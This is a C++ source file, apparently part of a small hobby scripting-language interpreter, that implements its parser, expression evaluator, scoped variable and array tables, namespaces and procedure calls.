Parser::~Parser(){
	MasterItemList.Delete(NULL, TRUE);
}

VOID Parser::Run(VOID){
	#ifdef _DEBUG
	dprintf("%s\r\n", Buffer);
	#endif
	while(CurrentToken != TOKEN_END){
		if(!ParseBlock()){
			#ifdef _DEBUG
			dprintf("Error: %s\r\n", Error);
			#endif
			return;
		}
		CurrentToken = Lexer.GetNextToken();
	}
}

VOID Parser::Abort(VOID){
	AbortScript = TRUE;
}

Variable* Parser::ParseStatement(UINT EndToken){
	BOOL Local = FALSE;
	UINT Index = 0;
	Expression CurrentExpression(this);
	NameSpace* CurrentNameSpace = &GlobalNameSpace;
	while(1){
		if(CheckForAbort())
			return NULL;
		if(CurrentToken == TOKEN_END){
			#ifdef _DEBUG
			SetError("Unexpected end of file");
			#endif
			return NULL;
		}else
		if(CurrentToken == TOKEN_ERROR){
			switch(Lexer.GetError()){
				case ERROR_INVALIDVARIABLENAME:
					#ifdef _DEBUG
					SetError("Invalid variable name");
					#endif*/
				break;
				case ERROR_NOSTRINGTERMINATOR:
					#ifdef _DEBUG
					SetError("Missing string terminator");
					#endif
				break;
				case ERROR_NOCOMMENTCLOSE:
					#ifdef _DEBUG
					SetError("No matching comment close");
					#endif
				break;
			}
			return NULL;
		}else
		if(CurrentToken == TOKEN_IDENTIFIER){
			Procedure* GetProcedure = CurrentNameSpace->ProcedureList.Get(Lexer.GetLexeme());
			if(strcmp(Lexer.GetLexeme(), "local") == 0){
				Local = TRUE;
			}else
			if(strcmp(Lexer.GetLexeme(), "if") == 0){
				if(!ParseIf())
					return NULL;
				return CurrentExpression.Parse(VAR_NONE);
			}else
			if(strcmp(Lexer.GetLexeme(), "while") == 0){
				if(!ParseWhile())
					return NULL;
				return CurrentExpression.Parse(VAR_NONE);
			}else
			if(GetProcedure){
				Variable* ParsedVariable = ParseFunction(GetProcedure);
				if(!ParsedVariable)
					return NULL;
				CurrentNameSpace = &GlobalNameSpace;
				CurrentExpression.Push(*ParsedVariable, TRUE);
			}else{
				#ifdef _DEBUG
				SetError("Unknown identifier");
				#endif
				return NULL;
			}
		}else
		if(CurrentToken == TOKEN_NAMESPACE){
			CHAR LexemeCopy[256];
			strncpy(LexemeCopy, Lexer.GetLexeme(), sizeof(LexemeCopy));
			LexemeCopy[strlen(LexemeCopy) - 1] = NULL;
			NameSpace* GetNameSpace = CurrentNameSpace->NameSpaceList.Get(LexemeCopy);
			if(GetNameSpace){
				CurrentNameSpace = GetNameSpace;
				#ifdef _DEBUG
				dprintf("Entering namespace %s\r\n", LexemeCopy);
				#endif
			}else{
				#ifdef _DEBUG
				SetError("Unknown namespace");
				#endif
				return NULL;
			}
		}else
		if(CurrentToken == TOKEN_VARIABLE){
			UINT Scope = 1;
			if(Local){
				#ifdef _DEBUG
				dprintf("variable is local scope of %d\r\n", CurrentScope);
				#endif
				Scope = CurrentScope;
			}
			if((*Lexer.GetLexeme()) == '$'){
				Variable* GetVariable = VariableTable.Get(Lexer.GetLexeme(), CurrentScope);
				if(!GetVariable){
					Variable* NewVariable = new Variable(VAR_NONE);
					NewVariable->Scope = Scope;
					MasterItemList.Add((Item*)NewVariable);
					VariableTable.Add(Lexer.GetLexeme(), NewVariable);
				}else{
					if(GetVariable->Scope != Scope && Local){
						#ifdef _DEBUG
						dprintf("scope of get variable does not match scope of %d adding new variable\r\n", Scope);
						#endif
						Variable* NewVariable = new Variable(VAR_NONE);
						NewVariable->Scope = Scope;
						MasterItemList.Add((Item*)NewVariable);
						VariableTable.Add(Lexer.GetLexeme(), NewVariable);
					}
				}
				if(Lexer.PeekNextToken() == TOKEN_OPERATOR && IsAssignmentOperator(GetOperatorType(Lexer.GetLexeme()))){
					Lexer.EndPeek();
					#ifdef _DEBUG
					dprintf("next token is an assignment operator, pushing actual variable\r\n");
					#endif
					CurrentExpression.Push(*VariableTable.Get(Lexer.GetLexeme(), Scope), FALSE);
				}else{
					Lexer.EndPeek();
					#ifdef _DEBUG
					dprintf("next token not assignment operator, pushing copy of variable %s\r\n", Lexer.GetLexeme());
					#endif
					Variable* GetVariable = VariableTable.Get(Lexer.GetLexeme(), CurrentScope);
					#ifdef _DEBUG
					dprintf("getvariable.type = %d %d\r\n", GetVariable->Type, GetVariable->Data.Integer);
					#endif
					if(GetVariable->Type == VAR_NONE){
						#ifdef _DEBUG
						SetError("Variable needs to be inititalized first");
						#endif
						return NULL;
					}
					Variable* NewVariable = new Variable(GetVariable->Type);
					NewVariable->Assign(*GetVariable);
					MasterItemList.Add((Item*)NewVariable);
					CurrentExpression.Push(*NewVariable, FALSE);
				}
			}else
			if((*Lexer.GetLexeme()) == '@'){
				#ifdef _DEBUG
				dprintf("array\r\n");
				#endif
				Array* GetArray = ArrayTable.Get(Lexer.GetLexeme(), CurrentScope);
				if(!GetArray){
					Array* NewArray = new Array(this);
					NewArray->Scope = Scope;
					MasterItemList.Add((Item*)NewArray);
					ArrayTable.Add(Lexer.GetLexeme(), NewArray);
				}else{
					if(GetArray->Scope != Scope && Local){
						#ifdef _DEBUG
						dprintf("scope of get array does not match scope of %d adding new array\r\n", Scope);
						#endif
						Array* NewArray = new Array(this);
						NewArray->Scope = Scope;
						MasterItemList.Add((Item*)NewArray);
						ArrayTable.Add(Lexer.GetLexeme(), NewArray);
					}
				}
				CHAR ArrayName[256];
				strncpy(ArrayName, Lexer.GetLexeme(), sizeof(ArrayName));
				UINT NextToken = Lexer.GetNextToken();
				if(NextToken == TOKEN_OPENBRACKET){
					Variable* ArrayIndexVariable = ParseStatement(TOKEN_CLOSEBRACKET);
					if(!ArrayIndexVariable)
						return NULL;
					Variable Temp(VAR_INTEGER);
					Temp.Assign(*ArrayIndexVariable);
					UINT ArrayIndex = Temp.Data.Integer;
					#ifdef _DEBUG
					dprintf("index = %d\r\n", ArrayIndex);
					#endif
					Variable* GetVariable = ArrayTable.Get(ArrayName, CurrentScope)->Get(ArrayIndex);
					if(!GetVariable){
						return NULL;
					}
					if(Lexer.PeekNextToken() == TOKEN_OPERATOR && IsAssignmentOperator(GetOperatorType(Lexer.GetLexeme()))){
						Lexer.EndPeek();
						#ifdef _DEBUG
						dprintf("next token is an assignment operator, pushing actual variable in array\r\n");
						#endif
						CurrentExpression.Push(*GetVariable, FALSE);
					}else{
						Lexer.EndPeek();
						#ifdef _DEBUG
						dprintf("next token not assignment operator, pushing copy of variable in array %s\r\n", ArrayName);
						#endif
						#ifdef _DEBUG
						dprintf("getvariable.type = %d %d\r\n", GetVariable->Type, GetVariable->Data.Integer);
						#endif
						if(GetVariable->Type == VAR_NONE){
							#ifdef _DEBUG
							SetError("Variable needs to be inititalized first");
							#endif
							return NULL;
						}
						Variable* NewVariable = new Variable(GetVariable->Type);
						NewVariable->Assign(*GetVariable);
						MasterItemList.Add((Item*)NewVariable);
						CurrentExpression.Push(*NewVariable, FALSE);
					}
				}
			}
			Local = FALSE;
		}else
		if(CurrentToken == TOKEN_OPENPARENTHESIS){
			CurrentToken = Lexer.GetNextToken();
			Variable* PushVariable = ParseStatement(TOKEN_CLOSEPARENTHESIS);
			if(!PushVariable)
				return NULL;
			CurrentExpression.Push(*PushVariable, TRUE);
		}else
		if(CurrentToken == EndToken){
			#ifdef _DEBUG
			dprintf("end token found\r\n");
			#endif
			return CurrentExpression.Parse(VAR_NONE);
		}else
		if(CurrentToken == TOKEN_OPENBRACE){
			if(!ParseBlock())
				return NULL;
			return CurrentExpression.Parse(VAR_NONE);
		}else
		if(CurrentToken == TOKEN_CLOSEBRACE){
			#ifdef _DEBUG
			SetError("'}'");
			#endif
			return NULL;
		}else
		if(CurrentToken == TOKEN_SEMICOLON){
			#ifdef _DEBUG
			SetError("';'");
			#endif
			return NULL;
		}else
		if(CurrentToken == TOKEN_CLOSEPARENTHESIS){
			#ifdef _DEBUG
			SetError("')'");
			#endif
			return NULL;
		}else
		if(CurrentToken == TOKEN_COMMA){
			#ifdef _DEBUG
			SetError("','");
			#endif
			return NULL;
		}else{
			CurrentExpression.Push(CurrentToken, Lexer.GetLexeme(), TRUE);
		}
		CurrentToken = Lexer.GetNextToken();
		Index++;
	}
}

BOOL Parser::ParseBlock(VOID){
	CurrentScope++;
	#ifdef _DEBUG
	dprintf("Parsing block %d\r\n", CurrentScope);
	#endif
	CurrentToken = Lexer.GetNextToken();
	while(CurrentToken != TOKEN_CLOSEBRACE){
		if(!ParseStatement())
			return NULL;
		CurrentToken = Lexer.GetNextToken();
	}
	#ifdef _DEBUG
	dprintf("Done parsing block %d\r\n", CurrentScope);
	#endif
	VariableTable.Remove(CurrentScope);
	ArrayTable.Remove(CurrentScope);
	MasterItemList.Delete(CurrentScope);
	CurrentScope--;
}

BOOL Parser::ParseIf(VOID){
	BOOL True = FALSE;
	#ifdef _DEBUG
	dprintf("parsing if\r\n");
	#endif
	if(CurrentToken = Lexer.GetNextToken() != TOKEN_OPENPARENTHESIS){
		#ifdef _DEBUG
		SetError("Invalid if statement");
		#endif
		return NULL;
	}
	CurrentToken = Lexer.GetNextToken();
	Variable* Statement = ParseStatement(TOKEN_CLOSEPARENTHESIS);
	if(!Statement)
		return NULL;
	CurrentToken = Lexer.GetNextToken();
	if(Statement->Data.Integer != 0){
		#ifdef _DEBUG
		dprintf("if statement true, parsing\r\n");
		#endif
		True = TRUE;
		if(!ParseStatement())
			return NULL;
	}else{
		#ifdef _DEBUG
		dprintf("if statement false, skipping\r\n");
		#endif
		SkipStatement();
	}
	Lexer.PeekNextToken();
	if(strcmp(Lexer.GetLexeme(), "else") == 0){
		Lexer.EndPeek();
		Lexer.GetNextToken();
		CurrentToken = Lexer.GetNextToken();
		if(True == FALSE){
			#ifdef _DEBUG
			dprintf("if statement false, parsing else\r\n");
			#endif
			if(!ParseStatement())
				return NULL;
		}else{
			#ifdef _DEBUG
			dprintf("if statement true, skipping else\r\n");
			#endif
			SkipStatement();
		}
	}
	Lexer.EndPeek();
	return TRUE;
}

BOOL Parser::ParseWhile(VOID){
	#ifdef _DEBUG
	dprintf("parsing while loop\r\n");
	#endif
	if(CurrentToken = Lexer.GetNextToken() != TOKEN_OPENPARENTHESIS){
		#ifdef _DEBUG
		SetError("Invalid while loop");
		#endif
		return NULL;
	}
	UINT StatementPosition = Lexer.GetPosition();
	CurrentToken = Lexer.GetNextToken();
	Variable* Statement = ParseStatement(TOKEN_CLOSEPARENTHESIS);
	if(!Statement)
		return NULL;
	CurrentToken = Lexer.GetNextToken();
	while(Statement->Data.Integer != 0){
		#ifdef _DEBUG
		dprintf("while is true, parsing\r\n");
		#endif
		if(!ParseStatement())
			return NULL;
		Lexer.SetPosition(StatementPosition);
		CurrentToken = Lexer.GetNextToken();
		Statement = ParseStatement(TOKEN_CLOSEPARENTHESIS);
		if(!Statement)
			return NULL;
		CurrentToken = Lexer.GetNextToken();
	}
	SkipStatement();
	return TRUE;
}

VOID Parser::SkipStatement(VOID){
	if(CurrentToken == TOKEN_OPENBRACE){
		UINT OpenBraces = 1;
		do{
			CurrentToken = Lexer.GetNextToken();
			if(CurrentToken == TOKEN_OPENBRACE)
				OpenBraces++;
			else if(CurrentToken == TOKEN_CLOSEBRACE)
				OpenBraces--;
		}while(OpenBraces != 0);
		//while(CurrentToken != TOKEN_CLOSEBRACE){
		//	CurrentToken = Lexer.GetNextToken();
		//}
	}else{
		while(CurrentToken != TOKEN_SEMICOLON){
			CurrentToken = Lexer.GetNextToken();
		}
	}
}

Variable* Parser::ParseFunction(Procedure* Procedure){
	#ifdef _DEBUG
	dprintf("parsing function\r\n");
	#endif
	Variable* Return = NULL;
	std::vector<Variable*> ParameterList;
	if(Lexer.GetNextToken() == TOKEN_OPENPARENTHESIS){
		CurrentToken = Lexer.GetNextToken();
		if(Procedure->GetParameterCount()){
			#ifdef _DEBUG
			dprintf("parsing parameters\r\n");	
			#endif
			for(UINT i = 0; i < Procedure->GetParameterCount(); i++){
				Variable* ParsedParameter = ParseStatement(i + 1 == Procedure->GetParameterCount() ? TOKEN_CLOSEPARENTHESIS : TOKEN_COMMA);
				if(!ParsedParameter)
					return NULL;
				ParameterList.push_back(ParsedParameter);
				if(i + 1 != Procedure->GetParameterCount())
					CurrentToken = Lexer.GetNextToken();
			}
		}
		Return = Procedure->Call(ParameterList, Script);
		MasterItemList.Add(Return);
	}
	if(!Return){
		#ifdef _DEBUG
		SetError("Invalid function");
		#endif
		return NULL;
	}
	return Return;
}

Parser::Expression::Expression(SEL::Parser* Parser){
	LastObject.TokenType = TOKEN_NONE;
	Expression::Parser = Parser;
}

Variable* Parser::Expression::Parse(UINT VariableType){
	#ifdef _DEBUG
	dprintf("Parsing Expression\r\n");
	#endif
	if(IsBinary(LastObject.TokenType, LastObject.Lexeme)){
		#ifdef _DEBUG
		Parser->SetError("Expected r-value");
		#endif
		return NULL;
	}
	Variable* Return = new Variable(VariableType);
	Return->Scope = Parser->CurrentScope;
	Parser->MasterItemList.Add((Item*)Return);
	UINT j = 0;
	while(!OperatorStack.empty()){
		Operator CurrentOperator = OperatorStack.back();
		OperatorStack.pop_back();
		if(CurrentOperator.Type == OP_NEGATIVE){
			#ifdef _DEBUG
			dprintf("OP_NEGATIVE\r\n");
			#endif
			TermStack.back().Variable->Negative();
		}else
		if(CurrentOperator.Type == OP_NOT){
			#ifdef _DEBUG
			dprintf("OP_NOT\r\n");
			#endif
			TermStack.back().Variable->Not();
		}else
		if(CurrentOperator.Type == OP_BITNOT){
			#ifdef _DEBUG
			dprintf("OP_BITNOT\r\n");
			#endif
			TermStack.back().Variable->BitNot();
		}else
		if(CurrentOperator.Type == OP_AND){
			#ifdef _DEBUG
			dprintf("OP_AND\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Term1.Variable->And(*Term2.Variable);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_OR){
			#ifdef _DEBUG
			dprintf("OP_OR\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Term1.Variable->Or(*Term2.Variable);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_EQUALS){
			#ifdef _DEBUG
			dprintf("OP_EQUALS\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Term1.Variable->Equals(*Term2.Variable);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_INEQUALITY){
			#ifdef _DEBUG
			dprintf("OP_INEQUALITY\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Term1.Variable->Equals(*Term2.Variable);
			Term1.Variable->Not();
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_GREATERTHAN){
			#ifdef _DEBUG
			dprintf("OP_GREATERTHAN\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Term1.Variable->GreaterThan(*Term2.Variable);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_LESSTHAN){
			#ifdef _DEBUG
			dprintf("OP_LESSTHAN\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Term1.Variable->LessThan(*Term2.Variable);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_GREATEROREQUAL){
			#ifdef _DEBUG
			dprintf("OP_GREATEROREQUAL\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Variable TempVar1, TempVar2;
			TempVar1.Assign(*Term1.Variable);
			TempVar2.Assign(*Term1.Variable);
			TempVar1.GreaterThan(*Term2.Variable);
			TempVar2.Equals(*Term2.Variable);
			TempVar1.Or(TempVar2);
			Term1.Variable->Assign(TempVar1);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_LESSOREQUAL){
			#ifdef _DEBUG
			dprintf("OP_LESSOREQUAL\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Variable TempVar1, TempVar2;
			TempVar1.Assign(*Term1.Variable);
			TempVar2.Assign(*Term1.Variable);
			TempVar1.LessThan(*Term2.Variable);
			TempVar2.Equals(*Term2.Variable);
			TempVar1.Or(TempVar2);
			Term1.Variable->Assign(TempVar1);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_ADD){
			#ifdef _DEBUG
			dprintf("OP_ADD\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Term1.Variable->Add(*Term2.Variable);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_SUBTRACT){
			#ifdef _DEBUG
			dprintf("OP_SUBTRACT\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Term1.Variable->Subtract(*Term2.Variable);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_INCREMENT){
			#ifdef _DEBUG
			dprintf("OP_INCREMENT\r\n");
			#endif
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Variable TempVar;
			TempVar.SetInteger(1);
			Term1.Variable->Add(TempVar);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_DECREMENT){
			#ifdef _DEBUG
			dprintf("OP_DECREMENT\r\n");
			#endif
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Variable TempVar;
			TempVar.SetInteger(1);
			Term1.Variable->Subtract(TempVar);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_MULTIPLY){
			#ifdef _DEBUG
			dprintf("OP_MULTIPLY\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Term1.Variable->Multiply(*Term2.Variable);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_DIVIDE){
			#ifdef _DEBUG
			dprintf("OP_DIVIDE\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Term1.Variable->Divide(*Term2.Variable);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_MODULUS){
			#ifdef _DEBUG
			dprintf("OP_MODULUS\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Term1.Variable->Modulus(*Term2.Variable);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_LEFTSHIFT){
			#ifdef _DEBUG
			dprintf("OP_LEFTSHIFT\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Term1.Variable->LeftShift(*Term2.Variable);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_RIGHTSHIFT){
			#ifdef _DEBUG
			dprintf("OP_RIGHTSHIFT\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Term1.Variable->RightShift(*Term2.Variable);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_BITAND){
			#ifdef _DEBUG
			dprintf("OP_BITAND\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Term1.Variable->BitAnd(*Term2.Variable);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_BITOR){
			#ifdef _DEBUG
			dprintf("OP_BITOR\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Term1.Variable->BitOr(*Term2.Variable);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_BITXOR){
			#ifdef _DEBUG
			dprintf("OP_BITXOR\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			Term1.Variable->BitXor(*Term2.Variable);
			TermStack.push_back(Term1);
		}else
		if(CurrentOperator.Type == OP_ASSIGN){
			#ifdef _DEBUG
			dprintf("OP_ASSIGN\r\n");
			#endif
			Term Term2 = TermStack.back();
			TermStack.pop_back();
			Term Term1 = TermStack.back();
			TermStack.pop_back();
			if(Term1.Variable->Constant){
				TermStack.push_back(Term1);
				TermStack.push_back(Term2);
				#ifdef _DEBUG
				Parser->SetError("Cannot assign to a constant");
				#endif
				return NULL;
			}else{
				Term1.Variable->Assign(*Term2.Variable);
				TermStack.push_back(Term1);
			}
		}
	}
	Variable* AssignedVariable = Return;
	if(!TermStack.empty()){
		AssignedVariable->Assign(*TermStack.back().Variable);
		if(AssignedVariable->IsString()){
			#ifdef _DEBUG
			dprintf("Assigned variable %s\r\n", AssignedVariable->Data.String);
			#endif
		}else
		if(AssignedVariable->IsInteger()){
			#ifdef _DEBUG
			dprintf("Assigned variable %d\r\n", AssignedVariable->Data.Integer);
			#endif
		}else
		if(AssignedVariable->IsFloat()){
			#ifdef _DEBUG
			dprintf("Assigned variable %g\r\n", AssignedVariable->Data.Float);
			#endif
		}
		if(TermStack.back().Variable->Constant){
			TermStack.pop_back();
		}
	}
	return AssignedVariable;
}

VOID Parser::Expression::Push(UINT TokenType, PCHAR Lexeme, BOOL Constant){
	if(TokenType == TOKEN_OPERATOR){
		Operator Operator;
		Operator.Type = GetOperatorType(Lexeme);
		Operator.TokenType = TokenType;
		strncpy(Operator.Lexeme, Lexeme, sizeof(Operator.Lexeme));
		if(Operator.Type == OP_SUBTRACT && (IsBinary(LastObject.TokenType, LastObject.Lexeme) || IsUnary(LastObject.TokenType, LastObject.Lexeme) && !IsTerm(LastObject.TokenType))){
			Operator.Type = OP_NEGATIVE;
			Operator.Lexeme[0] = 0x15; // convert subtract to negative
			#ifdef _DEBUG
			dprintf("s to n\r\n");
			#endif
		}
		CheckValidity(Operator);
		#ifdef _DEBUG
		dprintf("pushing operator %s %d\r\n", Operator.Lexeme, Operator.Type);
		#endif
		OperatorStack.push_back(Operator);
		strncpy(LastObject.Lexeme, Operator.Lexeme, sizeof(LastObject.Lexeme));
		LastObject.TokenType = TokenType;
	}else{
		Term Term;
		Term.TokenType = TokenType;
		strncpy(Term.Lexeme, Lexeme, sizeof(Term.Lexeme));
		//if(TokenType == TOKEN_VARIABLE){
		//	Term.Variable = Parser->VariableTable.Get(Lexeme, Parser->CurrentScope);
		//}else{
			Term.Variable = new Variable;
			Term.Variable->Assign(TokenType, Lexeme);
			Term.Variable->Constant = Constant;
			Term.Variable->Scope = Parser->CurrentScope;
			if(Term.Variable->Type == VAR_STRING){
				Term.Variable->ParseString();
			}
			Parser->MasterItemList.Add((Item*)Term.Variable);
		//}		
		CheckValidity(Term);
		#ifdef _DEBUG
		dprintf("pushing %s\r\n", Term.Lexeme);
		#endif
		TermStack.push_back(Term);
		strncpy(LastObject.Lexeme, Lexeme, sizeof(LastObject.Lexeme));
		LastObject.TokenType = TokenType;
	}
}

VOID Parser::Expression::Push(Variable & Variable, BOOL Constant){
	UINT TokenType = TOKEN_VARIABLE;
	if(Variable.IsInteger()){
		TokenType = TOKEN_INTEGER;
	}else
	if(Variable.IsFloat()){
		TokenType = TOKEN_FLOAT;
	}else
	if(Variable.IsString()){
		TokenType = TOKEN_STRING;
	}
	//SEL::Variable StringVariable(VAR_STRING);
	//StringVariable.Assign(Variable);
	//dprintf("%s\r\n", StringVariable.Data.String);
	Term Term;
	Term.TokenType = TokenType;
	Term.Variable = &Variable;
	Parser->MasterItemList.Add((Item*)&Variable);
	CheckValidity(Term);
	TermStack.push_back(Term);
	LastObject = Term;
	//Push(TokenType, StringVariable.Data.String, Constant, Parser);
}

BOOL Parser::Expression::CheckValidity(StackObject & StackObject){
	if(LastObject.TokenType == TOKEN_NONE){
		if(IsUnary(StackObject.TokenType, StackObject.Lexeme)){
			return TRUE;
		}else{
			#ifdef _DEBUG
			Parser->SetError("Expecting l-value");
			#endif
			return NULL;
		}
	}else{
		if(IsBinary(LastObject.TokenType, LastObject.Lexeme)){
			if(IsBinary(StackObject.TokenType, StackObject.Lexeme)){
				#ifdef _DEBUG
				CHAR Error[256];
				sprintf(Error, "Syntax error '%s'", StackObject.Lexeme);
				Parser->SetError(Error);
				#endif
				return NULL;
			}
		}else
		if(IsTerm(LastObject.TokenType)){
			if(IsTerm(StackObject.TokenType)){
				#ifdef _DEBUG
				Parser->SetError("Too many terms");
				#endif
				return NULL;
			}
		}else
		if(IsUnary(LastObject.TokenType, LastObject.Lexeme)){
			if(IsBinary(StackObject.TokenType, StackObject.Lexeme)){
				#ifdef _DEBUG
				CHAR Error[256];
				sprintf(Error, "Syntax error '%s'", StackObject.Lexeme);
				Parser->SetError(Error);
				#endif
				return NULL;
			}
		}
	}
}

VOID Parser::SetError(PCHAR Error){
	strncpy(Parser::Error, Error, sizeof(Parser::Error));
}

BOOL Parser::CheckForAbort(VOID){
	if(AbortScript){
		#ifdef _DEBUG
		SetError("Aborted");
		#endif
		return TRUE;
	}
	return FALSE;
}

template <class T>
ItemTable<T>::~ItemTable(){
	std::vector<PCHAR>::iterator i = ItemNames.begin();
	while(i != ItemNames.end()){
		delete (*i);
		i++;
	}
	std::vector<ItemList*>::iterator j = ItemLists.begin();
	while(j != ItemLists.end()){
		delete (*j);
		j++;
	}
	ItemNames.clear();
	ItemLists.clear();
}

template <class T>
BOOL ItemTable<T>::Add(PCHAR Name, T* T){
	BOOL Found = FALSE;
	UINT i = 0;
	for(i = 0; i < ItemNames.size(); i++){
		if(strcmp(ItemNames[i], Name) == 0){
			Found = TRUE;
			break;
		}
	}
	if(!Found){
		#ifdef _DEBUG
		dprintf("%s not in item table\r\n", Name);
		#endif
		PCHAR NameCopy = new CHAR[strlen(Name) + 1];
		strcpy(NameCopy, Name);
		ItemNames.push_back(NameCopy);
		ItemLists.push_back(new ItemList);
		i = ItemLists.size() - 1;
		#ifdef _DEBUG
		dprintf("inserted\r\n");
		#endif
	}
	if(ItemLists[i]->Add(T)){
		return TRUE;
	}else{
		return FALSE;
	}
	return FALSE;
}

template <class T>
T* ItemTable<T>::Get(PCHAR Name, UINT Scope){
	BOOL Found = FALSE;
	UINT i = 0;
	for(i = 0; i < ItemNames.size(); i++){
		if(strcmp(ItemNames[i], Name) == 0){
			Found = TRUE;
			break;
		}
	}
	if(Found){
		return ItemLists[i]->Get(Scope);
	}
	return NULL;
}

template <class T>
VOID ItemTable<T>::Remove(UINT Scope){
	for(UINT i = 0; i < ItemLists.size(); i++){
		ItemLists[i]->Remove(Scope);
	}
}

template <class T>
BOOL ItemTable<T>::ItemList::Add(T* T){
	for(UINT i = 0; i < Items.size(); i++){
		if(Items[i]->Scope == T->Scope)
			return FALSE;
	}
	Items.push_back(T);
	return TRUE;
}

template <class T>
T* ItemTable<T>::ItemList::Get(UINT Scope){
	#ifdef _DEBUG
	dprintf("get\r\n");
	#endif
	UINT HighestScope = 0;
	T* HighestScopeItem = NULL;
	for(UINT i = 0; i < Items.size(); i++){
		if(Items[i]->Scope >= HighestScope){
			if(Scope >= Items[i]->Scope){
				#ifdef _DEBUG
				dprintf("%d\r\n", Items[i]->Scope);
				#endif
				HighestScope = Items[i]->Scope;
				HighestScopeItem = Items[i];
			}
		}
	}
	#ifdef _DEBUG
	if(HighestScopeItem)
		dprintf("Highest scope Item = %d\r\n", HighestScope);
	#endif
	return HighestScopeItem;
}

template <class T>
VOID ItemTable<T>::ItemList::Remove(UINT Scope){
	for(UINT i = 0; i < Items.size(); i++){
		if(Items[i]->Scope == Scope){
			Items.erase(Items.begin() + i);
			i = 0;
		}
	}
}

VOID MasterItemList::Add(PVOID Item){
	if(std::find(ItemList.begin(), ItemList.end(), Item) == ItemList.end()){
		//dprintf("Adding %X item to MasterItemList\r\n", Item);
		ItemList.push_back(Item);
	}
}

VOID MasterItemList::Delete(UINT Scope, BOOL All){
	UINT i = 0;
	while(i < ItemList.size()){
		if(static_cast<Item*>(ItemList[i])->Scope == Scope || All){
			//dprintf("Deleting %X item from MasterItemList\r\n", ItemList[i]);
			delete ItemList[i];
			ItemList.erase(ItemList.begin() + i);
		}else{
			i++;
		}
	}
}

Procedure::Procedure(PCHAR Name, UINT ParameterCount){
	strncpy(Procedure::Name, Name, sizeof(Procedure::Name));
	Procedure::ParameterCount = ParameterCount;
	Return = NULL;
	Scope = 1;
}

Variable* Procedure::Call(std::vector<Variable*>& Parameters, SEL::Script* Script){
	Return = new Variable;
	Procedure::Script = Script;
	Body(Parameters);
	return Return;
}

UINT Procedure::GetParameterCount(VOID){
	return ParameterCount;
}

template <class T>
IdentifierList<T>::IdentifierList(SEL::Parser* Parser){
	IdentifierList::Parser = Parser;
}

template <class T>
VOID IdentifierList<T>::Add(T* Identifier){
	if(Get(Identifier->Name)){
		#ifdef _DEBUG
		dprintf("Identifier already in list\r\n");
		#endif
		return;
	}
	List.push_back(Identifier);
}

template <class T>
T* IdentifierList<T>::Get(PCHAR Name){
	for(UINT i = 0; i < List.size(); i++){
		if(strncmp(List[i]->Name, Name, sizeof(List[i]->Name)) == 0){
			return List[i];
		}
	}
	return NULL;
}

NameSpace::NameSpace(PCHAR Name, SEL::Parser* Parser) : ProcedureList(Parser), NameSpaceList(Parser){
	strncpy(NameSpace::Name, Name, sizeof(NameSpace::Name));
	Scope = 1;
}

